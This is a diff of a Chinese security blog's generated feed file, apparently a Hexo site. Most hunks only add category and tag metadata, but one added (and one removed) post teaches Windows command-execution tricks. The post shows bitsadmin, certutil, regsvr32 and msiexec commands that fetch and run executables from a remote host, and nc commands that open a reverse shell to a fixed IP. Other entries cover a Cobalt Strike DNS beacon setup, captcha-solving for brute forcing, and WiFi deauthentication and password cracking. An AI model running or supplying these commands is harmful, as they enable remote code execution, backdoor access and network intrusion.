@@ -61,6 +61,12 @@
     <content type="html"><![CDATA[<p>插件下载地址：<a href="https://github.com/f0ng/captcha-killer-modified">https://github.com/f0ng/captcha-killer-modified</a></p><p>burp插件配合<a href="https://github.com/sml2h3/ddddocr">ddddocr</a>实现验证码识别，适配新版burpsuite。</p><h3 id="1、burp配置"><a href="#1、burp配置" class="headerlink" title="1、burp配置"></a>1、burp配置</h3><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/1704508608454-ce7c17f2-3399-4696-b329-678e043ccf2c.png" alt="img"></p><h3 id="2、本地启动验证码识别脚本"><a href="#2、本地启动验证码识别脚本" class="headerlink" title="2、本地启动验证码识别脚本"></a>2、本地启动验证码识别脚本</h3><p><code>python ocr_server.py --port 9898 --ocr</code></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20240702101657734.png" alt="image-20240702101657734"></p><h3 id="3、插件配置"><a href="#3、插件配置" class="headerlink" title="3、插件配置"></a>3、插件配置</h3><p>右键发送验证码请求包到插件，接口url填写验证码识别接口：<a href="http://127.0.0.1:9898/">http://127.0.0.1:9898</a></p><p><strong>Requst数据包</strong>：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/ocr/b64/text</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:9898<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>55<br><br><span class="language-apache"><span class="hljs-section">&lt;@BASE64&gt;</span><span class="hljs-section">&lt;@IMG_RAW&gt;</span><span class="hljs-section">&lt;/@IMG_RAW&gt;</span><span class="hljs-section">&lt;/@BASE64&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="4、在Intruder模块调用"><a href="#4、在Intruder模块调用" class="headerlink" title="4、在Intruder模块调用"></a>4、在Intruder模块调用</h3><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/1704515183908-f86a9e55-8602-4059-a8fe-74fb8de7a2f0.gif" alt="img"></p>]]></content>
     
     
+    <categories>
+      
+      <category>工具使用</category>
+      
+    </categories>
+    
     
     <tags>
       
@@ -80,10 +86,16 @@
     <content type="html"><![CDATA[<h4 id="1、域名配置"><a href="#1、域名配置" class="headerlink" title="1、域名配置"></a>1、域名配置</h4><p>域名解析添加一条A记录指向VPS地址，添加NS记录指向A记录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 一条A记录指向CS的IP地址</span><br>vpn.test.com =&gt; VPS IP<br><span class="hljs-comment"># 几条NS记录指向刚刚A记录对应的域名</span><br>ns1.test.com =&gt; vpn.test.com<br>ns2.test.com =&gt; vpn.test.com<br>ns3.test.com =&gt; vpn.test.com<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/22794324/1704508609721-28542c15-ffd1-4e6a-9ec5-ffe5637e098a.png" alt="img"></p><h4 id="2、CS-Listener-配置"><a href="#2、CS-Listener-配置" class="headerlink" title="2、CS Listener 配置"></a>2、CS Listener 配置</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">Payload: DNS Beacon<br>DNS Hosts: 域名的NS记录<br>DNS Hosts(Stager): NS记录<br>DNS Port(Bind): 空<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/1704508609795-5c847678-5117-4fd8-a7c1-6177a9ec6c02.png" alt="img"></p>]]></content>
     
     
+    <categories>
+      
+      <category>工具使用</category>
+      
+    </categories>
+    
     
     <tags>
       
-      <tag>Cobaltstrike</tag>
+      <tag>cs</tag>
       
     </tags>
     
@@ -98,6 +110,12 @@
     
     <content type="html"><![CDATA[<h3 id="1、Windows桌面文件不能拖动"><a href="#1、Windows桌面文件不能拖动" class="headerlink" title="1、Windows桌面文件不能拖动"></a>1、Windows桌面文件不能拖动</h3><p><strong>解决方案：</strong></p><blockquote><p>长按键盘左上角Esc键几秒后松开即可</p></blockquote><h3 id="2、Windows系统，“桌面”变“Desktop”"><a href="#2、Windows系统，“桌面”变“Desktop”" class="headerlink" title="2、Windows系统，“桌面”变“Desktop”"></a>2、Windows系统，“桌面”变“Desktop”</h3><p><strong>解决方案：</strong></p><blockquote><p>检查桌面目录下的<code>desktop.ini</code>文件，写入下面的内容，然后重启桌面。<code>desktop.ini</code>文件不存在，就新建一个。</p></blockquote><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tex">[.ShellClassInfo]<br>LocalizedResourceName=@<span class="hljs-comment">%SystemRoot%\system32\shell32.dll,-21769</span><br>IconResource=<span class="hljs-comment">%SystemRoot%\system32\imageres.dll,-183</span><br></code></pre></td></tr></table></figure><h3 id="3、如何保存Win10锁屏界面的壁纸"><a href="#3、如何保存Win10锁屏界面的壁纸" class="headerlink" title="3、如何保存Win10锁屏界面的壁纸"></a>3、如何保存Win10锁屏界面的壁纸</h3><p><strong>解决方案：</strong></p><blockquote><p>聚焦壁纸的路径：<code>%localappdata%\Packages\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\LocalState\Assets</code></p><p>文件复制出来，修改后缀名<code>.jpg</code>。</p></blockquote><h3 id="4、Windows桌面文件删除后需要刷新一下才消失"><a href="#4、Windows桌面文件删除后需要刷新一下才消失" class="headerlink" title="4、Windows桌面文件删除后需要刷新一下才消失"></a>4、Windows桌面文件删除后需要刷新一下才消失</h3><p><strong>解决方案：</strong></p><blockquote><p>重启一下资源管理器<code>explorer.exe</code>就好了</p></blockquote><h3 id="5、Windows调整桌面-右键菜单-新建选项-的顺序"><a href="#5、Windows调整桌面-右键菜单-新建选项-的顺序" class="headerlink" title="5、Windows调整桌面 右键菜单 新建选项 的顺序"></a>5、Windows调整桌面 右键菜单 新建选项 的顺序</h3><p><strong>解决方案：</strong></p><blockquote><p>注册表位置：<code>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Discardable\PostSetup\ShellNew</code></p><p>修改Classes键值，排列成你想要的顺序</p></blockquote><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/1716858747861-d133d7f7-bf75-48e2-a49f-177a36022aef.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/1716858706450-88ba7023-51e2-44c3-bf65-fd91ee9f71ac.png" alt="img"></p><h3 id="6、Windows-桌面图标间距异常"><a href="#6、Windows-桌面图标间距异常" class="headerlink" title="6、Windows 桌面图标间距异常"></a>6、Windows 桌面图标间距异常</h3><p><strong>解决方案：</strong></p><blockquote><p>注册表位置：<code>计算机\HKEY_CURRENT_USER\Control Panel\Desktop\WindowMetrics</code></p><p>修改 <code>IconSpacing</code> 和 <code>IconVerticalSpacing</code> 这两个键值，默认值均为 -1125。</p><p><strong>IconSpacing</strong> 为「图标之间的水平间距」</p><p><strong>IconVerticalSpacing</strong> 为「图标之间的垂直间距」</p></blockquote><h3 id="7、浏览器访问异常：您目前无法访问-因为此网站使用了-HSTS。网络错误和攻击通常是暂时的，因此，此网页稍后可能会恢复正常。"><a href="#7、浏览器访问异常：您目前无法访问-因为此网站使用了-HSTS。网络错误和攻击通常是暂时的，因此，此网页稍后可能会恢复正常。" class="headerlink" title="7、浏览器访问异常：您目前无法访问 因为此网站使用了 HSTS。网络错误和攻击通常是暂时的，因此，此网页稍后可能会恢复正常。"></a>7、浏览器访问异常：您目前无法访问 因为此网站使用了 HSTS。网络错误和攻击通常是暂时的，因此，此网页稍后可能会恢复正常。</h3><p><strong>解决方案：</strong></p><blockquote><p>浏览器页面，键盘直接敲下：thisisunsafe</p></blockquote>]]></content>
     
+    
+    <categories>
+      
+      <category>杂七杂八</category>
+      
+    </categories>
     
     
     <tags>
@@ -152,7 +170,7 @@
     
     <tags>
       
-      <tag>漏洞复现</tag>
+      <tag>weblogic</tag>
       
     </tags>
     
@@ -211,6 +229,31 @@
   
   
   <entry>
+    <title>Win命令执行的的几种姿势</title>
+    <link href="/2022/07/21/Win%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF/"/>
+    <url>/2022/07/21/Win%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF/</url>
+    
+    <content type="html"><![CDATA[<h4 id="0、简介"><a href="#0、简介" class="headerlink" title="0、简介"></a>0、简介</h4><p>拿到目标shell可以使用下面几种命令执行的姿势。</p><h4 id="1、CobaltStrike-命令上线"><a href="#1、CobaltStrike-命令上线" class="headerlink" title="1、CobaltStrike 命令上线"></a>1、CobaltStrike 命令上线</h4><p>使用CobaltStrike生成powershell payload</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/cs.gif" alt="img"></p><h4 id="2、bitsadmin"><a href="#2、bitsadmin" class="headerlink" title="2、bitsadmin"></a>2、bitsadmin</h4><p>bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。</p><p>注：需要管理员权限，普通用户没有权限使用，保存文件需要绝对路径。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bitsadmin /transfer n http://xx.imortal.icu/artifact.exe C:\shell.exe &amp; start C:\shell.exe<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-1719815226535-1.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/bitsadmin.gif" alt="img"></p><p>使用nc反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bitsadmin /transfer n http://xx.imortal.icu/nc.exe C:\nc.exe &amp; start C:\nc.exe -t -e cmd.exe 121.4.69.24 6667<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/bitsadmin-nc.gif" alt="img"></p><h4 id="3、certutil"><a href="#3、certutil" class="headerlink" title="3、certutil"></a>3、certutil</h4><p>certutil工具用于备份证书服务，xp-win10都支持。certutil下载文件会留下缓存，建议下载文件后对缓存进行删除。</p><p>注：缓存位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content<br>certutil -urlcache -<span class="hljs-built_in">split</span> -f http://xx.imortal.icu/artifact.exe 7z.exe &amp; start 7z.exe<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/certutil.gif" alt="img"></p><p>注：certutil可以使用普通用户下运行，cs获得的权限根据命令用户的权限，普通用户不带红色闪电，使用管理员运行会带红色闪电</p><p>当然也可以使用nc反弹shell</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">certutil -urlcache -<span class="hljs-keyword">split</span> -<span class="hljs-keyword">f</span> http://xx.imortal.icu/nc.<span class="hljs-keyword">exe</span> nc.<span class="hljs-keyword">exe</span> &amp; start nc.<span class="hljs-keyword">exe</span> -t -<span class="hljs-keyword">e</span> cmd.<span class="hljs-keyword">exe</span> <span class="hljs-number">121.4</span>.<span class="hljs-number">69.24</span> <span class="hljs-number">6667</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/nc.gif" alt="img"></p><h4 id="4、regsvr32"><a href="#4、regsvr32" class="headerlink" title="4、regsvr32"></a>4、regsvr32</h4><p>regsvr32命令用于注册COM组件，是Windows系统提供用来向系统注册控件或者卸载控件的命令。我们可以通过构造.sct文件，去下载执行我们的后门程序。</p><p><strong>构造.sct文件执行命令</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">scriptlet</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">registration</span>    <span class="hljs-attr">progid</span>=<span class="hljs-string">&quot;ShortJSRAT&quot;</span>    <span class="hljs-attr">classid</span>=<span class="hljs-string">&quot;&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span> &gt;</span>    <br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;JScript&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml">        </span></span><br><span class="language-xml"><span class="language-handlebars">&lt;![CDATA[            </span></span><br><span class="language-xml"><span class="language-handlebars">ps  = &quot;cmd.exe /c calc.exe&quot;;            </span></span><br><span class="language-xml"><span class="language-handlebars">new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true);        </span></span><br><span class="language-xml"><span class="language-handlebars">]]&gt;</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">registration</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">scriptlet</span>&gt;</span><br>regsvr32.exe /u /n /s /i:http://xx.imortal.icu/calc.sct scrobj.dll<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/certutil1.gif"></p><h4 id="5、msiexec"><a href="#5、msiexec" class="headerlink" title="5、msiexec"></a>5、msiexec</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#使用msf生成msi文件，上传到vps</span><br>msfvenom -p windows/exec CMD=<span class="hljs-string">&#x27;calc.exe&#x27;</span> -f msi &gt; calc.msi<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-1-1719815236749-7.png" alt="img"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msiexec /q /i http://tools.imortal.icu/calc.msi<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/msiexec-calc.gif" alt="img"></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>奇技淫巧</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>命令执行</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>Python编写的百度URL采集工具</title>
     <link href="/2022/07/21/Python%E7%BC%96%E5%86%99%E7%9A%84%E7%99%BE%E5%BA%A6URL%E9%87%87%E9%9B%86%E5%B7%A5%E5%85%B7/"/>
     <url>/2022/07/21/Python%E7%BC%96%E5%86%99%E7%9A%84%E7%99%BE%E5%BA%A6URL%E9%87%87%E9%9B%86%E5%B7%A5%E5%85%B7/</url>
@@ -228,31 +271,6 @@
     <tags>
       
       <tag>Python</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>Win命令执行的的几种姿势</title>
-    <link href="/2022/07/21/Win%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF/"/>
-    <url>/2022/07/21/Win%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E7%9A%84%E5%87%A0%E7%A7%8D%E5%A7%BF%E5%8A%BF/</url>
-    
-    <content type="html"><![CDATA[<h4 id="0、简介"><a href="#0、简介" class="headerlink" title="0、简介"></a>0、简介</h4><p>拿到目标shell可以使用下面几种命令执行的姿势。</p><h4 id="1、CobaltStrike-命令上线"><a href="#1、CobaltStrike-命令上线" class="headerlink" title="1、CobaltStrike 命令上线"></a>1、CobaltStrike 命令上线</h4><p>使用CobaltStrike生成powershell payload</p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/cs.gif" alt="img"></p><h4 id="2、bitsadmin"><a href="#2、bitsadmin" class="headerlink" title="2、bitsadmin"></a>2、bitsadmin</h4><p>bitsadmin是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。</p><p>注：需要管理员权限，普通用户没有权限使用，保存文件需要绝对路径。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bitsadmin /transfer n http://xx.imortal.icu/artifact.exe C:\shell.exe &amp; start C:\shell.exe<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-1719815226535-1.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/bitsadmin.gif" alt="img"></p><p>使用nc反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bitsadmin /transfer n http://xx.imortal.icu/nc.exe C:\nc.exe &amp; start C:\nc.exe -t -e cmd.exe 121.4.69.24 6667<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/bitsadmin-nc.gif" alt="img"></p><h4 id="3、certutil"><a href="#3、certutil" class="headerlink" title="3、certutil"></a>3、certutil</h4><p>certutil工具用于备份证书服务，xp-win10都支持。certutil下载文件会留下缓存，建议下载文件后对缓存进行删除。</p><p>注：缓存位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content<br>certutil -urlcache -<span class="hljs-built_in">split</span> -f http://xx.imortal.icu/artifact.exe 7z.exe &amp; start 7z.exe<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/certutil.gif" alt="img"></p><p>注：certutil可以使用普通用户下运行，cs获得的权限根据命令用户的权限，普通用户不带红色闪电，使用管理员运行会带红色闪电</p><p>当然也可以使用nc反弹shell</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">certutil -urlcache -<span class="hljs-keyword">split</span> -<span class="hljs-keyword">f</span> http://xx.imortal.icu/nc.<span class="hljs-keyword">exe</span> nc.<span class="hljs-keyword">exe</span> &amp; start nc.<span class="hljs-keyword">exe</span> -t -<span class="hljs-keyword">e</span> cmd.<span class="hljs-keyword">exe</span> <span class="hljs-number">121.4</span>.<span class="hljs-number">69.24</span> <span class="hljs-number">6667</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/nc.gif" alt="img"></p><h4 id="4、regsvr32"><a href="#4、regsvr32" class="headerlink" title="4、regsvr32"></a>4、regsvr32</h4><p>regsvr32命令用于注册COM组件，是Windows系统提供用来向系统注册控件或者卸载控件的命令。我们可以通过构造.sct文件，去下载执行我们的后门程序。</p><p><strong>构造.sct文件执行命令</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">scriptlet</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">registration</span>    <span class="hljs-attr">progid</span>=<span class="hljs-string">&quot;ShortJSRAT&quot;</span>    <span class="hljs-attr">classid</span>=<span class="hljs-string">&quot;&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;&quot;</span> &gt;</span>    <br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;JScript&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml">        </span></span><br><span class="language-xml"><span class="language-handlebars">&lt;![CDATA[            </span></span><br><span class="language-xml"><span class="language-handlebars">ps  = &quot;cmd.exe /c calc.exe&quot;;            </span></span><br><span class="language-xml"><span class="language-handlebars">new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true);        </span></span><br><span class="language-xml"><span class="language-handlebars">]]&gt;</span></span><br><span class="language-xml"><span class="language-handlebars"></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">registration</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">scriptlet</span>&gt;</span><br>regsvr32.exe /u /n /s /i:http://xx.imortal.icu/calc.sct scrobj.dll<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/certutil1.gif"></p><h4 id="5、msiexec"><a href="#5、msiexec" class="headerlink" title="5、msiexec"></a>5、msiexec</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#使用msf生成msi文件，上传到vps</span><br>msfvenom -p windows/exec CMD=<span class="hljs-string">&#x27;calc.exe&#x27;</span> -f msi &gt; calc.msi<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-1-1719815236749-7.png" alt="img"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msiexec /q /i http://tools.imortal.icu/calc.msi<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/msiexec-calc.gif" alt="img"></p>]]></content>
-    
-    
-    <categories>
-      
-      <category>命令执行</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>命令执行</tag>
       
     </tags>
     
@@ -511,7 +529,7 @@
   
   
   <entry>
-    <title>phpMyAdmin getshell</title>
+    <title>phpMyAdmin 报错 getshell</title>
     <link href="/2020/09/10/phpMyAdmin%20getshell/"/>
     <url>/2020/09/10/phpMyAdmin%20getshell/</url>
     
@@ -552,7 +570,7 @@
     
     <tags>
       
-      <tag>arpg攻击</tag>
+      <tag>中间人攻击</tag>
       
     </tags>
     
@@ -693,10 +711,16 @@
     <content type="html"><![CDATA[<h4 id="1、设置无线网卡"><a href="#1、设置无线网卡" class="headerlink" title="1、设置无线网卡"></a>1、设置无线网卡</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看网卡信息</span><br>iwconfig<br><span class="hljs-comment"># 结束可能会影响网卡监听的进程</span><br>airmon-ng check <span class="hljs-built_in">kill</span><br><span class="hljs-comment"># 网卡设置为监听模式，完成后wlan0会变成wlan0mon</span><br>airmon-ng start wlan0<br><span class="hljs-comment"># 探测附件WiFi信息</span><br>airodump-ng wlan0mon<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191128205324-1719817692383-1.png" alt="img"></p><h4 id="2、抓取数据包"><a href="#2、抓取数据包" class="headerlink" title="2、抓取数据包"></a>2、抓取数据包</h4><p>抓取连接成功的数据包，用来解密wifi密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># airodump-ng wlan0mon -c 信道 --bssid 目标 -w 保存结果</span><br>airodump-ng wlan0mon -c 8 --bssid D4:**:**:**:**:E0 -w <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/InkedQQ%E6%88%AA%E5%9B%BE20191128205416_LI-1719817694811-3.jpg" alt="img"></p><h4 id="3、WiFi攻击"><a href="#3、WiFi攻击" class="headerlink" title="3、WiFi攻击"></a>3、WiFi攻击</h4><p>伪造数据包，模拟请求断开wifi连接。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 参数:</span><br>-0 <span class="hljs-comment"># 指定次数， 0 则一直攻击</span><br>-a <span class="hljs-comment"># 指定WiFi-BSSID </span><br>-c <span class="hljs-comment"># 指定已连接WiFi的目标设备STATION，也可以不指定目标，攻击全部已经连接的设备</span><br><br>aireplay-ng -0 10 -a D4:**:**:**:**:E0 wlan0mon -c 30:**:**:**:**:23  <br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191128205458-1719817696845-5.png" alt="img"></p><h4 id="4、爆破WiFi密码"><a href="#4、爆破WiFi密码" class="headerlink" title="4、爆破WiFi密码"></a>4、爆破WiFi密码</h4><p>抓取到数据包后，使用字典枚举wifi密码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 参数:</span><br>-w  <span class="hljs-comment"># 字典的路径</span><br>test-01.cap <span class="hljs-comment"># 抓取的数据包</span><br><br>aircrack-ng -w password.txt test-01.cap <br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191128205203-1719817698614-7.png" alt="img"></p>]]></content>
     
     
+    <categories>
+      
+      <category>无线安全</category>
+      
+    </categories>
+    
     
     <tags>
       
-      <tag>无线安全</tag>
+      <tag>WiFi</tag>
       
     </tags>
     
